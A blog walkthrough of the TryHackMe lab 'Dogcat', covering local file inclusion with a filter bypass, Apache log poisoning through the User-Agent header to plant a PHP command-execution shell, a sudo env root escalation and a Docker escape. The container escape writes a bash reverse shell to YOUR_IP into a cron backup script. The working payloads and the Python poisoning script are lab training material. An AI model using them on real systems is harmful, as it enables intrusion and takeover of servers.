---
layout: post
title: TryHackMe - Dogcat
summary: A detailed walkthrough on Dogcat from TryHackMe. Learn about Apache2 log poisoning...
date: 2020-07-03
author: Noxtal
categories: writeups
thumbnail:  tryhackme
tags:
 - tryhackme
 - web
 - lfi
 - rce
 - log poisoning
 - docker
---

 A detailed walkthrough on Dogcat from TryHackMe. Learn about Apache2 log poisoning...

-----

# Overview
### Description
> I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats!  This machine may take a few minutes to fully start up.

At the start, we are given a website to view cute pictures of dogs and cats.

![Main](https://i.imgur.com/l7fm21W.png)

After clicking on the dog button, a random image of a dog is displayed.

![Dog](https://i.imgur.com/DD7K8sa.png)

Most of this challenge is web-based (you can also notice that from an nmap scan). Let's then search for a web vulnerability.

# Solution
## Reconnaissance
As you have probably noticed, the choice of seeing either a cat or a dog is reflected in the *view* parameter. This is often a gateway to an LFI attack (Local File Inclusion). To learn more about this attack, I suggest you check my [learning platform](https://learn.noxtal.com). 

![Parameter](https://i.imgur.com/h1Iq20w.png)

### LFI
Let's start with a quick test: trying to input `../../../../etc/passwd` as *view* parameter. If this attack works correctly, we should hopefully get the contents of the `/etc/passwd` file displayed on the web page. Unfortunately, this gives us an error telling us it is only accepting a dog or a cat.

![Error](https://i.imgur.com/WwN171r.png)

We need to reverse-engineer the code to understand the real meaning of that error. To do so, we can try to use the PHP base64 encode filter LFI trick. Let's turn the *view* parameter to `php://filter/convert.base64-encode/resource=index`. This should give us the actual source code of the page encoded using base64.

This still doesn't work... I then assumed there is a kind of filter to check is the word dog or cat is included in the *view* parameter. That means we could try changing it to `php://filter/convert.base64-encode/cat/resource=index`.

This has worked! We have now got the base64 encoded version of the source code. Let's decode it using Cyberchef. Below is the PHP code, hence the most interesting part.

```php
<?php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
?>
```

We can see above that the only filters in place are, as I assumed, looking for the word *dog* and *cat* in the query string. That is not much of a problem because, fortunately for us, there is a command named cat in UNIX. This means that we can use `/etc/cat` or any directory related to the *cat* command to bypass the filter. Then, we only need to use `../` to get out of the directory and retrieve every file this user has access to.

We have now got a successful LFI exploit. With that, I thought of two main attacks we could try. The first one is about stealing the SSH private keys from the home directories. The second one involves poisoning the Apache2 logs to inject our own PHP code into the page. I went for the second one because it seemed the most interesting.

## Log Poisoning: LFI to RCE
To get a shell, we are going to need to use Apache2 logs for log poisoning. This technique consists of sending a request containing some PHP or JavaScript code. Then, when looking at the requests logs of Apache through a vulnerability like LFI, this code is going to be rendered on the page.

In our case, we can access the Apache2 logs using this string after the URL: `?view=../../../../var/log/apache2/cat/../access.log&ext=`. Here we use the *ext* parameter and put it because it allows us to use our custom extension in the path itself. This property is defined in the source code shown before.

![Apache2 Logs](https://i.imgur.com/FkIXax0.png)

By looking at the logs, we can find that the URL part is URL encoded. This means we cant inject our code there because it won't be properly reflected. There is one major field though that is not encoded: the user-agent. Let's write a short Python script to inject our payload in it. Writing Python scripts to solve pentesting problems is always useful. It will make you learn more and give you the ability to easily create tools you can use for other pentests. This is the code I came up with, let's take a look at it.

```python
#!/usr/bin/python3.8
import requests

url="YOUR_BOX_URL"
print("poisoning logs...")

payload = "<?php system((isset($_GET['c']))?$_GET['c']:'echo'); ?>"
headers = {"User-Agent": payload}

r = requests.get(url, headers = headers)

if r.status_code == 200:
  print("log poisoned!")
else:
  print("an error occurred, please try again")
```

This program uses the [requests](https://requests.readthedocs.io/en/master/) library to send the request to the server that is necessary to poison the logs. Then, we define the URL. I have put it in a separate variable to make it easier to change it and clearer. After some debug print messages, we get to the actual interesting part: the log poisoning. First, we define the payload. In that case, this is the payload I will be using.

```php
<?php system((isset($_GET['c']))?$_GET['c']:'echo'); ?>
```

This is a classical command injection payload. Once the logs will be poisoned, if we set the *c* variable, it will execute its value in the terminal.

*Note: if you want to reuse this program for another box and want to change the payload, be sure it contains no error. A good way to test for this is to test it locally. If you enter an incorrect payload, you will in a way "corrupt" the logs from your side and it will be difficult to inject a correct payload.*

Finally, the program sets the payload as user-agent and sends a request to the server. The final if/else statement is just for debug if there was a problem.

If we run that program now (having specified the right URL), we should get a message saying that the logs were successfully poisoned. Now, if we go back to the Apache2 logs and specify the *c* parameter, we can run commands.

![ls](https://i.imgur.com/WG2RHJd.png)

Now that we have a command injection, the only thing left is to pop a reverse shell inside the machine. For that, try the reverse shells from the Reverse Shell Cheatsheet by pentestmonkey. Don't forget to URL encode every special character (using, for instance, CyberChef) to be sure your command will run successfully. Run `nc -lvnp 4444` (or any other port) on your machine and put your reverse shell in the *c* parameter. You have now access to the machine!

![Revshell](https://i.imgur.com/0Zh5SH7.png)

The first flag is located in the directory where your shell will be spawned. The second one is in the parent directory.

## Privelege Escalation
To figure out a privesc, the fastest way is to use the `sudo -l` command. This command is not perfect though: it won't work if your current user isn't in sudoers and it might find nothing.

![sudo -l](https://i.imgur.com/GnqVyJ1.png)

Fortunately for us, this command returned good results. The last line says our current user can run `env` as root without the need of a password. Using [GTFOBins](https://gtfobins.github.io/), in the sudo category of the `env` command, we can find the right command to escalate our privileges to **root**.

![Privesc](https://i.imgur.com/F1sFjzU.png)

We are now **root**! If we now go in the `/root` directory, we can find the third flag. The only problem is, we miss one flag... where could it be?

After a bit of research, we can find a good hint that we are currently stuck inside a Docker container: the hostname (which can be found using the `hostname` command) is not the name of the box as usual. We need to get out of this container to get the 4th flag.

![Hostname before](https://i.imgur.com/PKLSGWl.png)

## Escaping the Container
We now need to find something that could help us get out of our container. I first searched for common directories until I stumbled in `/opt`. In that directory, we can find a folder named `backups`. In it, there are two files: a *backup.tar* file and a *backup.sh* script which runs about every minute to pack a backup into backup.tar. 

![Backup](https://i.imgur.com/0fsSNV0.png)

The problem is that we can edit that file, which makes it vulnerable. If we edit it to insert a reverse shell, we could get access to the machine behind the container, in other words, escaping the container. Let's create a netcat listener using `nc -lvnp 1234` (or any other port). Then, let's replace the *backup.sh* script with a reverse shell as shown below.

```bash
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/1234 0>&1
```

If we wait about 1 minute (it could take a bit more) we get a shell on our listener! We have now escaped the container. The final flag is under `/root`.

![Hostname after](https://i.imgur.com/kee2uwo.png)
